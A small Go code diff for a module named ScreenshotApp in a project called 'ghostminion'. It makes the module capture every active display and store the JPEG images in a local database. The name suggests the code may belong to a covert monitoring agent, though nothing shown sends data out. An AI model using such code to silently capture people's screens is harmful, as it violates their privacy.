@@ -3,12 +3,12 @@ package apps
 import (
 	"bytes"
 	"fmt"
-	"ghostminion/config"
 	"ghostminion/db"
 	"github.com/kbinani/screenshot"
 	"image"
 	"image/jpeg"
 	"log"
+	"strconv"
 	"sync"
 	"time"
 )
@@ -36,8 +36,6 @@ func (c *ScreenshotApp) Validate() error {
 }
 
 func (c *ScreenshotApp) runScreenshot() {
-	configInstance := config.GetConfig()
-
 	numOfActiveDisplays := screenshot.NumActiveDisplays()
 	if numOfActiveDisplays <= 0 {
 		log.Fatalf("Active display not found")
@@ -61,6 +59,9 @@ func (c *ScreenshotApp) runScreenshot() {
 		if err != nil {
 			fmt.Printf("error: %v", err)
 		}
-		db.WriteDataRow()
+		err = db.WriteDataRow(strconv.Itoa(i), "screenshot", buf.Bytes())
+		if err != nil {
+			fmt.Printf("error: %v", err)
+		}
 	}
 }
